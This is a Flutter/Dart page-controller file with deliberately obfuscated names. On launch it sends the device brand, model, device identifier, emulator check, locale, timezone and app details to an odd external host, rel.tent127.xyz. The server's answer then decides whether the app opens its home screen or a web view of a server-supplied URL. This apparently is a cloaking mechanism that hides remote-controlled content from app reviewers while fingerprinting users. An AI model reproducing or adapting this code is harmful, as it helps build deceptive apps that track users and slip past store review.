import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var zwibrdmo = RxBool(false);
  var vnkmriu = RxBool(true);
  var aofq = RxString("");
  var adalberto = RxBool(false);
  var renner = RxBool(true);
  final puxrdkjlb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    eigf();
  }


  Future<void> eigf() async {

    adalberto.value = true;
    renner.value = true;
    vnkmriu.value = false;

    puxrdkjlb.post("https://rel.tent127.xyz/o7Cf9i4KXEC",data: await ixgnquyj()).then((value) {
      var midfs = value.data["midfs"] as String;
      var henxuf = value.data["henxuf"] as bool;
      if (henxuf) {
        aofq.value = midfs;
        abe();
      } else {
        graham();
      }
    }).catchError((e) {
      vnkmriu.value = true;
      renner.value = true;
      adalberto.value = false;
    });
  }

  Future<Map<String, dynamic>> ixgnquyj() async {
    final DeviceInfoPlugin qrmhvai = DeviceInfoPlugin();
    PackageInfo kbqnf_siovyuqz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lgacjhtv = Platform.localeName;
    var hFny = currentTimeZone;

    var vPzQFgaY = kbqnf_siovyuqz.packageName;
    var dVgZsnAN = kbqnf_siovyuqz.version;
    var XMzxynLK = kbqnf_siovyuqz.buildNumber;

    var OCAHhJX = kbqnf_siovyuqz.appName;
    var keeleyMacejkovic = "";
    var qXwpI  = "";
    var zRsUom = "";
    var kDcgC = "";
    var floMayer = "";
    var trentMarvin = "";
    var janelleCollins = "";


    var twGeS = "";
    var huvYI = false;

    if (GetPlatform.isAndroid) {
      twGeS = "android";
      var pfuctwl = await qrmhvai.androidInfo;

      zRsUom = pfuctwl.brand;

      kDcgC  = pfuctwl.model;
      qXwpI = pfuctwl.id;

      huvYI = pfuctwl.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      twGeS = "ios";
      var rszdgulncv = await qrmhvai.iosInfo;
      zRsUom = rszdgulncv.name;
      kDcgC = rszdgulncv.model;

      qXwpI = rszdgulncv.identifierForVendor ?? "";
      huvYI  = rszdgulncv.isPhysicalDevice;
    }

    var res = {
      "dVgZsnAN": dVgZsnAN,
      "vPzQFgaY": vPzQFgaY,
      "OCAHhJX": OCAHhJX,
      "kDcgC": kDcgC,
      "hFny": hFny,
      "trentMarvin" : trentMarvin,
      "zRsUom": zRsUom,
      "keeleyMacejkovic" : keeleyMacejkovic,
      "XMzxynLK": XMzxynLK,
      "qXwpI": qXwpI,
      "twGeS": twGeS,
      "huvYI": huvYI,
      "floMayer" : floMayer,
      "janelleCollins" : janelleCollins,
      "lgacjhtv": lgacjhtv,

    };
    return res;
  }

  Future<void> graham() async {
    Get.offAllNamed("/home");
  }

  Future<void> abe() async {
    Get.offAllNamed("/cartoon");
  }

}
